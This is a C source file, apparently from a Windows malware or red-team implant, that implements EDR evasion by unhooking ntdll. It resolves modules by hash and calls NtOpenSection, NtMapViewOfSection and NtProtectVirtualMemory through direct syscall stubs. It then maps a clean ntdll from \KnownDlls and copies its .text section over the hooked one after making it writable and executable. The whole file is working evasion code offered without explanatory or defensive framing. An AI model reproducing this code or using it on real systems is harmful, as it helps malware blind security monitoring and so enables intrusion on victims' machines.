#include "Unhook.h"
#include "Syscall.h"
#include "Resolve.h"
#include "Hashes.h"
#include <string.h>

static PBYTE TextSect(PVOID img, PDWORD out) {
	PBYTE base = (PBYTE)img;
	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);

	PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
	for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
		if (memcmp(sec->Name, ".text", 5) == 0) {
			*out = sec->Misc.VirtualSize;
			return base + sec->VirtualAddress;
		}
	}
	return NULL;
}

VOID UnhookNtdll(VOID) {
	typedef NTSTATUS (NTAPI* fn_Open)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
	typedef NTSTATUS (NTAPI* fn_Map)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
	typedef NTSTATUS (NTAPI* fn_Prot)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
	typedef NTSTATUS (NTAPI* fn_Unmap)(HANDLE, PVOID);
	typedef NTSTATUS (NTAPI* fn_Close)(HANDLE);

	HMODULE ntdll = ResolveModuleH(H_NTDLL);
	if (!ntdll)
		return;

	DWORD loadSize = 0;
	PBYTE loadText = TextSect(ntdll, &loadSize);
	if (!loadText)
		return;

	fn_Open  pOpen  = (fn_Open)SyscallStub(GetSsn("NtOpenSection"));
	fn_Map   pMap   = (fn_Map)SyscallStub(GetSsn("NtMapViewOfSection"));
	fn_Prot  pProt  = (fn_Prot)SyscallStub(GetSsn("NtProtectVirtualMemory"));
	fn_Unmap pUnmap = (fn_Unmap)SyscallStub(GetSsn("NtUnmapViewOfSection"));
	fn_Close pClose = (fn_Close)SyscallStub(GetSsn("NtClose"));
	if (!pOpen || !pMap || !pProt || !pUnmap || !pClose)
		return;

	WCHAR path[] = L"\\KnownDlls\\ntdll.dll";
	UNICODE_STRING uni;
	uni.Length = (USHORT)(wcslen(path) * sizeof(WCHAR));
	uni.MaximumLength = uni.Length + sizeof(WCHAR);
	uni.Buffer = path;

	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, &uni, OBJ_CASE_INSENSITIVE, NULL, NULL);

	HANDLE hSec = NULL;
	if (pOpen(&hSec, SECTION_MAP_READ, &oa) < 0)
		return;

	PVOID clean = NULL;
	SIZE_T vsize = 0;
	if (pMap(hSec, (HANDLE)-1, &clean, 0, 0, NULL, &vsize, 1, 0, PAGE_READONLY) < 0) {
		pClose(hSec);
		return;
	}

	DWORD cleanSize = 0;
	PBYTE cleanText = TextSect(clean, &cleanSize);
	if (cleanText) {
		DWORD n = (cleanSize < loadSize) ? cleanSize : loadSize;

		PVOID tb = loadText;
		SIZE_T tn = loadSize;
		ULONG old = 0;

		if (pProt((HANDLE)-1, &tb, &tn, PAGE_EXECUTE_READWRITE, &old) >= 0) {
			memcpy(loadText, cleanText, n);
			pProt((HANDLE)-1, &tb, &tn, old, &old);
		}
	}

	pUnmap((HANDLE)-1, clean);
	pClose(hSec);
}
